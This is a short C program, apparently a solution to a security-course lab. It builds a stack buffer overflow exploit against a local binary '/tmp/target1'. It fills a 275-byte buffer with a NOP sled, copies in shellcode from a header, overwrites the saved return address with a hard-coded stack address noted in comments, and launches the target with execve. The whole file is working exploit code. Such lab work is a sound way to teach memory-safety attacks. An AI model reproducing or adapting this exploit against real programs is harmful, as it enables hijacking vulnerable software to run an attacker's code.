#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
char payload[275];

int main(void) {
  int i;
/*
  // found out that the eip for foo is at 0x bf ff fd 70
  // found out that the buffer starts at 0x bf ff fb 6c (put shellcode there)

  // make it point at another location, say 0xbfff fb 6c
  // 01 starts again at 0x bf ff fc 70
  // offset = 255'
*/

  for(i=0; i<275; i++){
        payload[i] = 0x90;
  }

  strcpy(payload, shellcode);
  payload[45] = 0x90;

  payload[260] = 0x4c;
  payload[261] = 0xfc;
  payload[262] = 0xff;
  payload[263] = 0xbf;

  // and then put the shell code there.
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
